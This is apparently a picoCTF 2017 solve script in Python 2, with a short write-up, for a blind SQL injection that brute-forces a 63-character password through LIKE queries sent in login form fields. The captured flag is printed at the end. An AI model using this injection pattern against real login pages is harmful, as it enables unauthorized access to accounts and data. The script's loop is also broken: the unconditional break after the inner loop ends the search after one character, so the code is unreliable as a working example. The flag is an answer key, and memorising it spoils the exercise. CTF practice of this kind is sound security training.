import requests
import string

URL = "http://shell2017.picoctf.com:16012"
BASE_QUERY = "' OR pass LIKE \"%s%%\" -- "

def check_password(candidate):
    query = BASE_QUERY % (candidate)
    response = requests.post(URL, {"username": query, "password": query})
    return "User not Found." not in response.text

flag = ""
alphabet = string.lowercase + string.digits + "_"
while len(flag) < 63:
    for letter in alphabet:
        candidate = flag + letter
        if check_password(candidate):
            flag += letter
            print "Flag: " + flag
            break
    print "[!] Could not find next character in the flag"
    break

print flag

"""
Running a basic ' OR 1=1 -- injection gives us the following message:
Login Functionality Not Complete. Flag is 63 characters

Because of this, we know that we need to use a blind sql attack, making use of LIKE queries
to brute force the user's password.

The above message indicates success, while "User not found." indicates failure.
With this, we can perform our attack

not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f515
"""
